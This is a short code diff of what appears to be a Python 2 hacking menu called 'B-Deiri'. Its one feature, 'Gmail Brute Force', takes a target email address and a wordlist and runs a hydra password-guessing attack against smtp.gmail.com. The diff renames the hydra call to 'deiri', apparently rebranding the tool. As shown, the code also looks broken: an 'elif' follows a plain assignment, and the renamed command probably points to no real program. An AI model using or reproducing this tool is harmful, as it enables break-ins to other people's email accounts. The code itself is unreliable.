@@ -28,7 +28,7 @@ print " [01] Gmail Brute Force         "
 print
 print " [00] Exit"
 print
-bhydra = raw_input("[*] B-Deiri > ")
+bdeiri = raw_input("[*] B-Deiri > ")
   
 elif bdeiri == '01' or bdeiri == '1':
   print
@@ -39,7 +39,7 @@ elif bdeiri == '01' or bdeiri == '1':
   print
   email = raw_input("[*] Email : ")
   word = raw_input("[*] Wordlist : ")
-  os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
+  os.system("deiri -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
   sys.exit()
   
 elif bdeiri == '00' or bdeiri == '0':
